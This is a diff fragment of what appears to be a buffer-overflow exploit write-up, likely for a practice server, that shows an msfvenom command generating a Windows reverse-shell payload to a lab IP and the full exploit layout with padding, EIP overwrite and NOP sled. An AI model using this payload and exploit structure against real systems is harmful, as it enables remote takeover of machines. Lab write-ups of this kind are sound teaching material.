@@ -137,6 +137,7 @@ You can google this part yourself, we just need to generate a payload (reverse s
    
 - Command   
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.230.1 LPORT=9001 -f python -v shellcode -b "\x00" EXITFUNC=thread -e x86/shikata_ga_nai -i 5`
+
 ### Adding Nopsled and Full Exploit Structure
 Nopsled is being used to adjust the stack so the shellcode will be executed properly. I personally always use 16 bytes of nopsleds because 16 is the magic number ;). So, at the end the full payload should look like this:   
 `payload="TRUN . " + "A"*2005 + EIP + "\x90"*16 + <shellcodes generated>`
